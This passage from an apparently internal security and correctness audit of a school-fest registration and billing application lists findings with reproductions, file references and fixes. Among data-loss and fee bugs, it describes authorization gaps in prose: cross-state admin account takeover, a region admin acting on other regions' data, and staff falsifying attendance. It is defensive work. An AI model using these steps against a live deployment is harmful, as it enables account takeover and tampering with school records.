**Actual.** Only the *last* student processed for that item ends up registered — every earlier student is silently deleted, no error, while the returned counts/messages claim full success. `FestBulkRegistrationService.php:91-112` loops per-student with a single-element performer array each time. `createForSchool()` redirects an existing registration on the same item to `updateForSchool()`, which wipes the *entire* roster (`$registration->participants()->delete();`) before re-adding only the new call's participants. The shipped CSV import template itself puts two different students on the same solo item with no team name — exactly this failure pattern.

**Reproduction.** Create/use a solo item with `max_per_school >= 2`. Bulk-assign 2+ students to that one item in a single action, or import a 2-row CSV. Reload registrations — only the last student submitted is present. Two fresh scratch probes confirmed live: `assignStudentsToItems()` with 3 students on a `max_per_school=3` item returned `{"created":3,"errors":[]}` but only 1 registration persisted (containing only the 3rd student); `importFromSpreadsheet()` with a matching 2-row CSV returned `{"imported":2,"skipped":0,"errors":[]}` but only 1 registration persisted.

**Files.** `app/Services/Events/FestBulkRegistrationService.php:91-112`; `app/Services/Events/FestRegistrationImportService.php:53`; `app/Services/Events/FestRegistrationCreateService.php:117-134,404`.

**Business impact.** Silent roster/data loss for any school using bulk-assign or CSV import for a solo item allowing more than one entrant per school — schools believe every athlete/performer is registered; only the last one processed actually is. No test file references either service with more than one student on one solo item.

**Security/data impact.** Data-integrity failure, not an authorization failure — but a severe one given it presents false success.

**Recommended fix.** In both callers, aggregate all students destined for the same solo item into one `createForSchool()`/`updateForSchool()` call (merging with any already-registered roster) instead of one call per student.

**Regression tests.** None exist. Add coverage driving both services with 2+ students on one solo item, asserting all persist.

**Estimated scope:** medium (two services need the same aggregation fix). **Dependencies:** none.

---

#### `SCHREG-02` — `registration_locked` is enforced on new registrations but never on editing an existing one
**Severity:** P0 · **Status:** confirmed · **Source:** Audit 1 §6.3

**Tenant:** any · **Actors:** School Admin (`FestRegistrationController::update()` → `FestRegistrationCreateService::updateForSchool()`) · **Event types:** any event, once a Sahodaya admin sets `registration_locked=true` · **Phase/level:** registration locking (post-submission roster freeze)

**Expected.** Once `registration_locked=true` is set, schools should no longer add/remove/swap participants on *any* registration for that event — matching what already happens for brand-new registrations.

**Actual.** New registrations are correctly blocked. Editing the roster of an already-existing, approved registration via the school's own update endpoint succeeds anyway. `grep -n "EventLifecycleGate|registration_locked" FestRegistrationCreateService.php` returns exactly one match — inside `createForSchool()`; zero matches anywhere in `updateForSchool()`. `FestRegistrationService::canSchoolEditRoster()` checks only status/event-status/`results_published`/`isRegistrationOpen()`, and `isRegistrationOpen()` never checks `registration_locked`.

**Reproduction.** School has an approved registration for an item. Sahodaya admin sets `registration_locked=true`. School opens that same registration, changes the selected student(s), submits — saved with no lock error. Scratch probe confirmed: `createForSchool()` correctly threw the lock error after locking; `updateForSchool()` on the *same* already-approved registration with a different student succeeded with no exception, changing `student_id` in the database.

**Files.** `app/Services/Events/FestRegistrationCreateService.php:86` (only lock check, inside `createForSchool()`); `updateForSchool()` (lines 296-493, zero lock references); `app/Services/Events/FestRegistrationService.php:260-279` (`canSchoolEditRoster()`); `app/Http/Controllers/SchoolAdmin/FestRegistrationController.php:1420` (`importStore()`'s own separate explicit lock guard, with no equivalent in `update()`).

**Business impact.** The "lock registration" control Sahodaya admins rely on to freeze rosters before chest-number reveal/fest day does not do what its label promises.

**Security/data impact.** A school can keep swapping performers in and out of already-submitted/approved entries after the lock — undermines chest-number integrity and fest-day roster trust.

**Recommended fix.** Add the same `EventLifecycleGate` check `createForSchool()` already has (or at minimum an explicit `registration_locked` guard) to `updateForSchool()`.

**Regression tests.** None exist against the roster-edit path (only `importStore()` has coverage of this flag).

**Estimated scope:** small (one guard addition). **Dependencies:** none.

---

#### `SA-01` — A State Admin can fully take over another state's administrative accounts
**Severity:** P0 · **Status:** confirmed (verified in both working tree and committed HEAD) · **Source:** Audit 1 §6.11

**Tenant:** cross-state, State tier (not Sahodaya-tenant-scoped) · **Actors:** `state_admin`, `state_staff` (State Admin portal → State Users) · **Event types:** N/A (account administration) · **Phase/level:** state user/account administration

**Expected.** A `state_admin` should only be able to view/manage `state_admin`/`state_staff` accounts belonging to their own state, matching the `StateScope::apply()`/`assertOwns()` isolation pattern every sibling state-tier controller uses (e.g. `StateRemittanceController`, confirmed to call it in all 5 of its methods).

**Actual.** `StateUserController` has **zero** `StateScope` references — confirmed true in both the current working tree and `git show HEAD`; this gap was never fixed in this file, in any committed version. `index()`/`exportCredentials()` query `PlatformUser` with no state filter; `store()`/`update()` validate `state_id` only as `nullable|uuid|exists:states,id` with no restriction to the acting admin's own state; `destroy()`/`toggleActive()` only guard against acting on your own account. All 5 state-users routes admit both `state_admin` and `state_staff` via `EnsureStateAdmin` (only `state_staff` is blocked from non-GET).

**Reproduction.** As a `state_admin` scoped to State A: POST to create a new fully-privileged `state_admin` account with `state_id=<State B id>` → persists. PUT to rename an existing State-B admin → mutated, no 403. GET the list → lists every state's accounts. PATCH toggle-active on a State B account → deactivated. Scratch HTTP-level test, logged in as a real `state_admin` scoped to a fresh "Probe State A," reproduced all four cross-state actions above against a "Probe State B" — all succeeded, no 403 anywhere, 9 assertions.

**Files.** `app/Http/Controllers/Admin/StateUserController.php:16-213` (full file, 0 `StateScope` references); `routes/web.php:79,158-165`; `app/Http/Middleware/EnsureStateAdmin.php:22-40`. Contrast: `app/Http/Controllers/Admin/StateRemittanceController.php` (calls `StateScope::apply()`/`assertOwns()` in every method).

**Business impact.** Full cross-state takeover of the administrative layer itself — the account layer every other state-tier control ultimately depends on.

**Security/data impact.** Any authenticated `state_admin`, for any state, can mint new fully-privileged `state_admin` accounts scoped to any other state, or rename/change-password/reassign/deactivate/delete an existing other-state admin's account, via real production routes with no 403 anywhere in the chain.

**Recommended fix.** Add `StateScope::apply()` to `index()`/`exportCredentials()` and `StateScope::assertOwns($user->state_id)` to `update()`/`destroy()`/`toggleActive()`; constrain `store()`'s accepted `state_id` to the acting admin's own scope unless the actor is superadmin — the exact pattern `StateRemittanceController` already uses.

**Regression tests.** Add `state_admin`-acting cases to `StateUserControllerTest.php` (currently superadmin-only) or fold into `StateCrossIsolationTest.php`, asserting 403/empty-list/scoped-only results for cross-state list/create/update/deactivate.

**Estimated scope:** medium (one controller, four methods, reuses an existing pattern). **Dependencies:** should land together with `SA-02` — see next entry and §19.

---

#### `SA-02` — The entire State-tier isolation mechanism exists only in the uncommitted working tree
**Severity:** P0 · **Status:** confirmed · **Source:** Audit 1 §6.11

**Tenant:** cross-state, State tier · **Actors:** `state_admin`/`state_staff` · **Event types:** all State Finals conduct · **Phase/level:** state fest conduct — judge assignment, mark entry, attendance, results publication

**Expected.** The state-tier isolation mechanism (`StateScope`, `PlatformState`, the `state_id` migrations, `EnsureStateAdmin`'s `stateId` attribute) should exist in the commit that would actually be deployed, not only in the uncommitted working tree.

**Actual.** `git status --short` (re-confirmed this pass, see §2.1's live `git status` — the repo's working tree remains uncommitted and substantially larger than at the time of the source audits, 62 changed paths at last check) shows `app/Support/StateScope.php`, `app/Models/PlatformState.php`, `tests/Feature/State/StateCrossIsolationTest.php`, and 4 migrations as untracked. `git show HEAD:...StateFestWorkspaceController.php`/`...StateAttendanceController.php` both grep zero matches for `StateScope`. `git show HEAD:...EnsureStateAdmin.php` ends right after the write-block check — no `stateId` attribute line exists in the committed version.

**Reproduction.** Not independently re-executed against a clean checkout of HEAD in this or the source session (would require discarding the working tree — explicitly out of scope for a read-only audit and this synthesis pass alike, which was instructed not to touch git state). Confirmed instead via direct `git show HEAD:<file>` inspection of the exact files that would run if HEAD were deployed. `php artisan test tests/Feature/State/ tests/Feature/Admin/StateControllerTest.php` → 41 tests, 41 passed, 230 assertions, confirming the mechanism **as it exists in the uncommitted working tree** is genuinely implemented and tested.

**Files.** `app/Support/StateScope.php` (untracked); `app/Models/PlatformState.php` (untracked); `tests/Feature/State/StateCrossIsolationTest.php` (untracked); 4 migrations (untracked); `app/Http/Middleware/EnsureStateAdmin.php` (working-tree diff is a pure 6-line addition, `stateId` attribute).

**Business impact.** If the deployment pipeline builds from git commits rather than the working tree, the live application currently has zero state-based access control anywhere in the state fest conduct pipeline.

**Security/data impact.** Any `state_admin`/`state_staff` for any state could act on every other state's Finals event; compounding with `SA-01`, the account layer would be unprotected too. In the current uncommitted working tree this specific mechanism is genuinely implemented and tested — the risk is entirely about what actually ships.

**Recommended fix.** Review and commit this working-tree batch (`StateScope`, `PlatformState`, the 4 migrations, and the dependent controller/middleware/route diffs) as a priority, before or together with `SA-01`'s fix, since `SA-01`'s own fix should reuse `StateScope`.

**Regression tests.** `StateCrossIsolationTest.php` (currently untracked) already covers this; committing it alongside the fix prevents silent regression on the next deploy-from-git.

**Estimated scope:** small (this is a commit-hygiene action, not new code — the code already exists and passes 41/41). **Dependencies:** blocks `SA-01`'s fix from being meaningful in production; also underlies the now-uncommitted fix that `SA-06` (§9.4) depends on for its own "not a gap" verdict to hold once deployed.

---

#### `PHASE-01` — Editing a phase's lifecycle fields through the admin UI has zero effect once synced
**Severity:** P0 · **Status:** confirmed · **Source:** Audit 2 §1, §9a

**Tenant:** any using `phased_regional_billing` · **Actors:** Sahodaya Admin (phase editing); School Admin / judges (affected downstream) · **Event types:** any event using `phased_regional_billing` conduct · **Phase/level:** phase lifecycle — registration window, lock, status, once the phase has synced at least once (which happens automatically on the first registration routed to it)

**Expected.** Editing a phase's registration window/lock/status through the documented admin write path (`FestEventPhaseController::update()`/`quickStatus()`) should take effect on the actual gates (`EventLifecycleGate::allowRegistrationForItem`/`allowMarkEntryForItem`) that govern registration and mark entry.

**Actual.** `FestPhaseTopologyService`'s auto-resync is only lazy — it fires solely when the leaf event is entirely missing. Once a leaf exists (synced on first use), editing the **root** phase never re-syncs it; only `assignItems()` calls `sync()`. The registration gate reads a stale leaf/child-phase copy indefinitely.

**Reproduction.** Throwaway test built a `phased_regional_billing` event, synced topology once, then edited the root phase's `registration_close` to the past via the exact controller methods, and reloaded fresh. The leaf event, leaf's child phase, and leaf item all still reported the phase as open ~5-6 days later; `EventLifecycleGate::allowRegistrationForItem()` did not throw. Test file was written, run, and deleted; working tree confirmed clean.

**Files.** `app/Services/Events/FestPhaseTopologyService.php` (sync logic — only lazy, triggered by leaf-missing); `app/Http/Controllers/SahodayaAdmin/FestEventPhaseController.php` (`update()`/`quickStatus()`, the write path that silently has no downstream effect); `app/Services/Events/EventLifecycleGate.php` (`allowRegistrationForItem`/`allowMarkEntryForItem`, both read the stale copy).

**Business impact.** An admin closing a phase (e.g. to stop late registrations, or in response to a real-world schedule change) believes the change took effect — the UI accepts the edit with no error — while registration and mark entry both continue exactly as before on the actual leaf event schools and judges interact with.

**Security/data impact.** Not an authorization bypass — a silent no-op that defeats the admin's own control, with no signal anywhere that it failed.

**Recommended fix.** Trigger `FestPhaseTopologyService::sync()` (or a targeted resync) from `FestEventPhaseService::updatePhase()`/`transitionStatus()` whenever the event uses phased regional billing.

**Regression tests.** Sync a phase once, edit it via the normal `update()`/`quickStatus()` path, assert the leaf/child-phase reflect the edit (or that a resync is auto-triggered) — **CRITICAL**, currently zero coverage.

**Estimated scope:** small–medium (one resync trigger, but must be verified against every phase-editing entry point). **Dependencies:** `PHASE-02`/`PHASE-03`/`PHASE-04`/`PHASE-05` all describe adjacent phase-awareness gaps that should be fixed in the same effort, since they share root cause and code area.

---

#### `MCS-01` — Registration is structurally blocked for 2 of MCS's 4 planned phases
**Severity:** P0 · **Status:** confirmed · **Source:** Audit 2 §5, §9d, §12

**Tenant:** MCS (not a live tenant — see §7), any Sahodaya adopting the same `phased_regional_billing` + non-regional-phase pattern · **Actors:** School Admin (registration attempt) · **Event types:** `phased_regional_billing` events with at least one non-regional phase · **Phase/level:** Digi Fest and District Kalotsav phases specifically (2 of MCS's planned 4)

**Expected.** A school should be able to register for an item under any of MCS's four planned phases (Digi Fest, Off Stage, Sargadhara, District Kalotsav), with fees resolving per §7's Level 1/Level 2 batch+phase model.

**Actual.** `FestRegistrationCreateService::createForSchool()` calls `FestSchoolPhaseRegionService::lockForRegistration()` unconditionally for any phase-scoped item, and that method throws `ValidationException` ("Select a region…") for **every** non-regional phase, because no region-selection row can ever exist for a phase that `select()` itself refuses to accept. Two of MCS's four phases (Digi Fest, District Kalotsav) are not region-partitioned by design, so registration for them is structurally impossible through the normal school-facing flow.

**Reproduction.** Configure a `phased_regional_billing` event with a non-regional phase (Digi Fest). Attempt `createForSchool()` for an item under that phase. `ValidationException`, "Select a region…", every time.

**Files.** `app/Services/Events/FestSchoolPhaseRegionService.php:19-30,108-114` (`lockForRegistration()`, `select()`); `app/Services/Events/FestRegistrationCreateService.php` (unconditional call site).

**Business impact.** Half of MCS's planned four-phase structure cannot accept a single registration through the normal school-facing flow the instant `phased_regional_billing` is used by a real tenant — this closes off Level-1 registration (Digi Fest is part of Level 1 per §7's worked example) entirely.

**Security/data impact.** Functional blocker, not a security issue — but a total one for the affected phases.

**Recommended fix.** Guard `lockForRegistration()`'s two call sites with the same `isRegional()` check `operationalEvent()` already uses, so non-regional phases skip the region-selection requirement.

**Regression tests.** `createForSchool()` succeeds for an item under a non-regional phase (Digi Fest/District) of a `phased_regional_billing` event — **CRITICAL, this is the fix's own regression test** — currently zero coverage.

**Estimated scope:** small (one guard, two call sites). **Dependencies:** should land before any MCS-style tenant onboarding; independent of the other P0s.

---

#### `FEE-01[Snapshot]` — `recalculate()` and its siblings silently overwrite `total_due` even when the fee is already paid
**Severity:** P0 · **Status:** confirmed · **Source:** Audit 2 §9b, §4 (boundary test row 25)

**Tenant:** any · **Actors:** Sahodaya Admin (any fee-schedule edit) · **Event types:** any billing model (`recalculate()`, `recalculateForSportsEvent()`, `recalculateForHead()`, `recalculateForPhase()`) · **Phase/level:** fee-schedule mutation after payment

**Expected.** Once a fee is fully paid and approved, an unrelated schedule edit should not silently change `total_due` underneath it — or should at minimum produce an audit trail.

**Actual.** `recalculate()` and its 3 sibling methods unconditionally overwrite `total_due` even when `amount_paid > 0`, with no guard and no audit trail. The only place in the codebase that *does* guard this (`FestRegistrationBatchFeeService::recalculateBatch()`) is not reused by any of the other four methods — a cross-method inconsistency tracked separately as `FEE-03[Snapshot]` (P1, §12).

**Reproduction.** A fully-paid, approved `flat_school` fee (₹1,000). An unrelated schedule edit, then `recalculate()`. `total_due` silently becomes ₹1,800; `amount_paid` stays ₹1,000; status flips to `partial`; **0 `AuditLog` rows** recording the change, before or after.

**Files.** `app/Services/Events/FestSchoolEventFeeService.php` (`recalculate()`, `recalculateForSportsEvent()`, `recalculateForHead()`, `recalculateForPhase()`); contrast `app/Services/Events/FestRegistrationBatchFeeService.php:102-106` (the one guarded sibling).

**Business impact.** A school that has already paid in full can be shown a new, larger outstanding balance purely because of an unrelated admin edit elsewhere in the fee configuration, with zero record of why.

**Security/data impact.** Data-integrity and financial-trust issue — the "official" fee total is not stable once payment has occurred, and there is no way to reconstruct what happened after the fact.

**Recommended fix.** Add the `recalculateBatch()` immutability guard (or an explicit adjustment record) to `recalculate()`, `recalculateForSportsEvent()`, `recalculateForHead()`, and `recalculateForPhase()`.

**Regression tests.** `total_due` preserved (or an adjustment row created) when `recalculate()` runs a second time on a record with `amount_paid > 0` — **CRITICAL**, currently zero coverage across all four methods.

**Estimated scope:** medium (four methods, one shared guard pattern to extract and apply). **Dependencies:** should land together with `FEE-02[Snapshot]` (next entry) — both are the same root defect class (post-payment mutation with no snapshot) hitting adjacent layers (fee row vs. invoice row).

---

#### `FEE-02[Snapshot]` — Invoice status is a sticky "paid" OR-clause that survives a silent total change
**Severity:** P0 · **Status:** confirmed · **Source:** Audit 2 §9b, §4 (boundary test row 26)

**Tenant:** any · **Actors:** Sahodaya Admin, School Admin (both view the same invoice) · **Event types:** the plain `issueForSchool()` path and its sports-composite twin (not `issueForSchoolBatch()`/`issueForSchoolPerHead()`, which don't share this bug) · **Phase/level:** invoice re-issue after a fee-schedule edit

**Expected.** An invoice's status should be derived from the current fee state at the moment it's viewed, so a shortfall introduced by a later schedule edit is visible.

**Actual.** `FestInvoiceService`'s status formula is sticky: `($fee?->status === 'approved' || $existing?->status === 'paid') ? 'paid' : …`. Once an invoice has ever been "paid," every future re-issue against the same row (`updateOrCreate` keyed only on `event_id+school_id`, no version bump) keeps reporting "paid" regardless of the freshly-computed fee status — while `total_amount` on that same row silently changes underneath it.

**Reproduction.** An invoice showing ₹1,000/"paid." An unrelated schedule edit. Re-issue: same invoice id/number, `total_amount` silently changes ₹1,000→₹1,800, status **still "paid"** despite an actual ₹800 shortfall.

**Files.** `app/Services/Events/FestInvoiceService.php` (status formula; `issueForSchool()` and its sports-composite twin specifically).

**Business impact.** Finance staff and schools alike can be shown an invoice that claims full settlement while actually understating what's owed by a material amount, with no visual or data signal of the discrepancy.

**Security/data impact.** Financial-integrity issue — the "official" invoice record can misstate settlement status indefinitely.

**Recommended fix.** Fix the invoice sticky-status OR-clause so status is derived purely from the current fee state, not partly from history.

**Regression tests.** Invoice status/`total_amount` correctness on re-issue after a fee-schedule change — **CRITICAL**, currently zero coverage.

**Estimated scope:** small–medium (one status formula, but must be checked against every invoice-issuance call site for behavior change). **Dependencies:** shares root cause with `FEE-01[Snapshot]`; fix together.

---

#### `FEE-02[Financial]` — Cancelling a batch-billed (MCS-style) event will not credit already-paid schools, even once the crash is fixed
**Severity:** P0 · **Status:** confirmed · **Source:** Audit 2 §9c, §4 (boundary test row 28)

**Tenant:** MCS-style batch-billed events (not a live tenant — see §7); any tenant using `FestRegistrationBatchFeeService` · **Actors:** Sahodaya Admin (cancellation) · **Event types:** batch-billed events (`FestRegistrationBatch` + `FestEventPhase`) · **Phase/level:** event cancellation, post-payment

**Expected.** Cancelling a batch-billed event with already-paid schools should compute and issue a fee credit for the amount those schools overpaid once their registrations are withdrawn.

**Actual.** Independent of the crash in `EVT-01[Event setup]`/`FEE-01[Financial]` above: even once that's fixed, `FestRegistrationBatchFeeService`'s own immutability guard (the *correct* one, from `FEE-01[Snapshot]`'s discussion) freezes `total_due` the instant `amount_paid > 0`. After cancellation withdraws the registrations, the recomputed total is discarded and the stale (still-fully-due) total is returned, making the credit computation `min(0, paid) = 0`.

**Reproduction.** MCS-style batch cancellation, ₹4,100 fully paid, registrations withdrawn as part of cancellation. Expected credit ≈ ₹4,100. Actual reduction computed = ₹0.

**Files.** `app/Services/Events/FestRegistrationBatchFeeService.php` (the immutability guard, correct in isolation but interacting badly here); `app/Services/Events/FestEventStatusService.php` (`transitionToCancelled()`'s credit-computation logic).

**Business impact.** Every school that fully paid into a batch-billed event before it was cancelled loses that money with no automatic path to a refund/credit — exactly the billing model this audit's MCS section is about.

**Security/data impact.** Financial-integrity issue with direct monetary consequence for schools, not merely a display bug.

**Recommended fix.** Once `EVT-01[Event setup]`/`FEE-01[Financial]` lands, make `transitionToCancelled()` compute the credit directly from the registrations it just withdrew, rather than relying on `recalculateBatch()`'s now-frozen total.

**Regression tests.** Batch-billed event cancellation issues the correct credit once the guard interaction is resolved — **CRITICAL**, currently untestable until the P0 crash above is fixed first.

**Estimated scope:** small–medium. **Dependencies:** hard-blocked on `EVT-01[Event setup]`/`FEE-01[Financial]` landing first (cannot even be reached for testing until cancellation itself works).

---

### 9.2 P1 — 38 findings (registration/eligibility, event operations, marks & results, qualification/certificates, navigation & public, phase & fee, reports/security/technical)

#### `CS-01` — Pair/Trio items don't enforce roster size or count toward group caps
**P1 · confirmed · Audit 1 §6.2.** Tenant: any · Actors: Sahodaya Admin (item setup), School Admin/Portal (registration) · Event types: any using `participant_type='pair'|'trio'` · Phase: registration.
**Expected → Actual.** Pair/Trio items should enforce `FestTeamSquadRules::validateCount()` (min 2/3) and count toward group caps, since `MULTI_PERSON_TYPES`/`isTeamItem()` both include them. Instead, `FestRegistrationCreateService`, all 4 `FestParticipationLimitService` call sites, and `FestRegistrationImportService` all gate their multi-person branch with the literal `in_array($item->participant_type, ['group','team'], true)`, excluding pair/trio — they fall into the "individual" branch, where `count($performerIds) > max_per_school` is enforced instead: at default `max_per_school=1` a genuine 2-student pair is rejected; if raised, no minimum roster is enforced and pair/trio evade group caps.
**Reproduction & evidence.** Pair item at default `max_per_school=1`: registering 2 students → rejected. Same item at `max_per_school=2`: registering 1 student → accepted, no minimum-roster error. Confirmed at `FestRegistrationCreateService.php:102,360`, `FestParticipationLimitService.php:78,354,396,520`, `FestRegistrationImportService.php:48,166,182-187` vs. `FestTeamSquadRules.php:18,29-42` and `FestEventItem.php:131-134`.
**Impact.** Admins cannot practically use the Pair/Trio item type without either breaking valid registrations or losing minimum-roster enforcement and group-cap evasion.
**Fix.** Replace the hardcoded `['group','team']` check with `FestTeamSquadRules::isMultiPerson($item->participant_type)` consistently across all three services.
**Tests.** None exist for pair/trio through registration. **Scope:** medium. **Dependencies:** none.

---

#### `CS-02` — "Prior qualification required" eligibility rule is a permanent no-op
**P1 · confirmed · Audit 1 §6.2.** Tenant: any · Actors: Sahodaya Admin (rule setup), any registering student · Event types: any · Phase: eligibility/registration.
**Expected → Actual.** A `rule_type=require_prior_qualification` rule should reject a student without prior-round qualification. `FestEligibilityRuleEngine::evaluate()` unconditionally returns `null` for this rule type — a pure no-op. Worse, because the engine's OR-across-logic-groups semantics short-circuit on any zero-error group, placing this rule alone in its own group as an OR-alternative to a real restriction (e.g. gender) makes that group trivially pass for everyone, defeating the real restriction.
**Reproduction & evidence.** Rule A (`gender=female`, group 0) + Rule B (`require_prior_qualification`, group 1, OR): a male student with no qualification history → zero errors, registration allowed. `FestEligibilityRuleEngine.php:65,123`. A real, unrelated check (`FestRegistrationEligibilityService::validateSchoolQualification()`) exists but is gated to `event_type='sports' && level_round='sahodaya'` only — structurally unconnected, making the code's own comment misleading.
**Impact.** Any admin combining this rule with another as an OR-alternative gets a silently broken gate; used alone it never blocks anyone.
**Fix.** Implement the actual check in `evaluate()`, mirroring `validateSchoolQualification()`'s pattern, or remove the option from `RULE_TYPES` until implemented.
**Tests.** None (confirmed test_gap prior to this finding). **Scope:** medium. **Dependencies:** none.

---

#### `CS-03` — Eligibility rules never apply once a registration routes to a partition child
**P1 · confirmed · Audit 1 §6.2.** Tenant: any using `conduct_mode=partitioned` · Actors: Sahodaya Admin (rule setup), School Admin/Portal (routed registration) · Event types: kalolsavam and any partitioned-conduct event · Phase: eligibility/registration.
**Expected → Actual.** A rule scoped to a partitioned hub event/item should still constrain registrations routed to a region/finale child, matching `FestParticipationPolicyService::resolveForEvent()`'s explicit parent-fallback. Instead, `FestRegistrationCreateService::createForSchool()` reassigns `$item`/`$event` to the routed child (a new-id `FestEventItem` row via `FestItemSyncService::copyItemToPartition()`) *before* eligibility validation runs; `FestEligibilityRuleEngine::rulesFor()` looks up rules keyed by the (now-child) ids only, with zero parent-fallback.
**Reproduction & evidence.** Gender=female-only rule on a partitioned hub: hub-direct registration of a male student correctly rejected; region-child registration of the identical student → zero errors, succeeds. `FestRegistrationCreateService.php:46-71,69-70`; `FestItemSyncService.php:197-253`; `FestEligibilityRuleEngine.php:76-104` (no fallback) vs. `FestParticipationPolicyService.php:29-33` (has one).
**Impact.** For any Sahodaya running multi-region/finale conduct — the documented normal case — event/item eligibility restrictions configured on the hub are silently unenforced for every school routed to a partition child, with no error surfaced.
**Fix.** Have `FestEligibilityRuleEngine::rulesFor()` also include the hub's event id (and hub item id via `inherited_from_item_id`) whenever the event has a `parent_event_id`, mirroring `FestParticipationPolicyService`.
**Tests.** Add an integration test: partitioned hub + region child + hub-scoped rule, asserting rejection through the child. **Scope:** medium. **Dependencies:** shares code area with `PHASE-01`–`PHASE-05`.

---

#### `SCHREG-03` — Approving a substitution via `replacement_student_id` skips eligibility validation entirely
**P1 · confirmed · Audit 1 §6.3.** Tenant: any · Actors: Sahodaya Admin (approval), School Admin (request) · Event types: any, most visibly gender/age/class-restricted items · Phase: substitution review.
**Expected → Actual.** Approving a substitution should re-validate the incoming student against item eligibility and keep numbering attached correctly. When the request carries `replacement_student_id` (not `replacement_participant_id`), approval does only a same-school check and directly overwrites the participant's `student_id` — no eligibility check, and pre-existing registration numbers stay attached to the new (possibly ineligible) student.
**Reproduction & evidence.** Female-only item + approved female performer (numbers '1'/'1') + a pending request naming a male replacement: approve → 302 success, `student_id` changed to the male student, numbers stay '1'/'1' — misattributed. `FestSubstitutionReviewController.php:39-72,57-62`; the UI never binds this field, but it is live and reachable server-side. A direct control call to `FestRegistrationEligibilityService::validateStudent()` on the same pair confirmed it would have rejected.
**Impact.** A Sahodaya admin approving a substitution has no way to know they are bypassing the exact eligibility checks every other entry path enforces.
**Fix.** Route the `replacement_student_id` branch through `FestRegistrationEligibilityService::validateStudent()` and the numbering service, or restrict it to students already standby on that same registration (matching the already-safe `replacement_participant_id` path).
**Tests.** None exist for either substitution controller. **Scope:** small. **Dependencies:** none.

---

#### `Event-ops EVT-01` — A region_admin can act on another region's clash requests via the hub URL
**P1 · confirmed · Audit 1 §6.4.** Tenant: any partitioned · Actors: `region_admin` · Event types: any Sahodaya-level event with `conduct_mode=partitioned` · Phase: clash review/appeals-disqualification/attendance via the hub.
**Expected → Actual.** A region_admin must never write another region's data on any route under `events/{event}/...`. Only the `/reports/*` group additionally wraps this with `region.report.scope`, swapping the bound `$event` for the caller's own region; clash-requests, attendance, schedule, judges, staff, marks, appeals, catering, houses routes are not in that group — `$event` stays the raw hub, and any controller authorizing via `reportableEventIds()` (hub+children) grants cross-region access. The identical pattern exists in `FestAppealController` (disqualify/reinstate) and `FestAttendanceController` (store/bulkStore) — the latter's docblock explicitly documents `store()`/`importStore()` as left unfixed "intentionally."
**Reproduction & evidence.** Region-A-scoped admin POSTing `clash-requests.approve` with `{event}=hub` against a real pending Region-B clash request → 302, `clash->status==='approved'`. `FestClashReviewController.php:38,56`.
**Impact.** A region coordinator with motive to hurt a rival region's standings has a working path to approve/reject clash outcomes, and by the identical unfixed pattern very likely disqualify/reinstate participants and falsify attendance, for a region they have no legitimate access to.
**Fix.** Widen `ResolveRegionScopedReportEvent`'s route coverage (or add a caller-region check) to every operational route in the `events.*` group, not just `/reports/*`.
**Tests.** None exist for `FestClashReviewController`, `FestAppealController`, or `FestAttendanceController`. **Scope:** medium. **Dependencies:** shares mechanism with `SEC-01[Lifecycle]` — fix both region-scoping gaps in one sweep.

---

#### `Event-ops EVT-02` — A narrowly-assigned `fest_ops` staffer can scan/mark attendance on any event in the tenant
**P1 · confirmed · Audit 1 §6.4.** Tenant: any · Actors: `fest_ops` role staff (auto-granted on any single duty) · Phase: gate/attendance.
**Expected → Actual.** A staffer should only scan/mark attendance for an event they hold a `FestEventStaff` assignment on. `FestGateController::assertCanScan()` bypasses the `FestEventStaff` check entirely for anyone holding the tenant-wide `fest_ops` role, regardless of which event earned it; `FestEventStaffController` auto-grants `fest_ops` on any duty other than marks/region_admin; `EnsureFestEventOps` has no per-event check either.
**Reproduction & evidence.** Staffer with `FestEventStaff(event_id=Y, duty=food)` only. POST `gate-check` with `mark_attendance=true` for unrelated Event X → 302, real `fest_attendance` row created with `status='present'`. `FestGateController.php:80-92`.
**Impact.** Any operational staffer, however narrowly assigned, can falsify official present/absent attendance on any other event in the same Sahodaya, and views participant PII for events they have no legitimate involvement in. Attendance feeds eligibility/results reporting elsewhere.
**Fix.** Require an actual `FestEventStaff` row for the specific `{event}` in `assertCanScan()`, mirroring `authorizeAssignment()`/`authorizeDuty()` already used elsewhere in `FestEventOpsController`.
**Tests.** No test file exists for `FestGateController`. **Scope:** small. **Dependencies:** none.

---

#### `Event-ops EVT-03` — The Appeals queue is silently empty on any partitioned hub event
**P1 · confirmed · Audit 1 §6.4.** Tenant: any partitioned · Actors: Sahodaya Admin · Event types: any hub with region children · Phase: appeals review via the hub.
**Expected → Actual.** Opening Appeals for a hub should show every appeal filed by any school under that hub. `FestAppealController::index()` filters `where('event_id', $event->id)` while the disqualified query *in the same method* correctly uses `reportableEventIds()`. Appeals are always created against the participant's actual (child) registration `event_id`, never the hub, so on any hub with region children `index()` returns zero rows. `Portal/FestEventOpsController::appeals()` has the identical bug shape. Even a same-file fix to `index()` alone would be incomplete: `resolve()`/`markFeePaid()` gate on strict equality `abort_if($appeal->event_id !== $event->id, 403)`, so a hub-level reviewer would see a widened list and then 403 acting on it.
**Reproduction & evidence.** Opening `appeals.index` for a hub with one real pending region-child appeal returns 0 rows in `appeals` prop while `disqualifyCandidates` (same response) is non-empty. `FestAppealController.php:18,23-24,29-31`.
**Impact.** On any partitioned/region event, the Appeals queue is effectively empty for hub-level reviewers unless an admin separately opens each region's own child event by URL.
**Fix.** Filter `FestAppeal` by `$event->reportableEventIds()` in both controllers, matching the disqualified queries in the same methods; fix `resolve()`/`markFeePaid()`'s strict-equality check in the same change.
**Tests.** No test file exists for `FestAppealController` or `Portal/FestEventOpsController`'s appeals path. **Scope:** small–medium. **Dependencies:** same theme as `Event-ops EVT-01`.

---

#### `Event-ops EVT-04` — Teacher double-booking is never detected by schedule clash checking
**P1 · confirmed · Audit 1 §6.4.** Tenant: any · Actors: Teacher-Fest participants and any event type where `FestParticipant.teacher_id` is populated · Phase: schedule generation/clash detection.
**Expected → Actual.** `FestScheduleConflictService::detectAll()` should flag a double-booking for the same person, student or teacher, scheduled into two overlapping items. `studentIdsForSchedule()` checks only `$p?->student_id`, silently falling through to empty for a teacher-only participant; `teacher_id` is never referenced anywhere in the method. `detectAll()` is the actual gate used at publish time.
**Reproduction & evidence.** Teacher Fest, two 60-minute items, same teacher, starts 30 minutes apart: teacher case returns an empty clash array; an identical student-based control case correctly returns exactly 1 clash. `FestScheduleConflictService.php:163-189`.
**Impact.** For Teacher Fest (and any event where teachers compete), a teacher can be double-booked into two overlapping items with zero warning anywhere in the schedule builder, publish-time gate, or clashes report — surfacing only on the event day.
**Fix.** Generalize `studentIdsForSchedule()` to also resolve `teacher_id`.
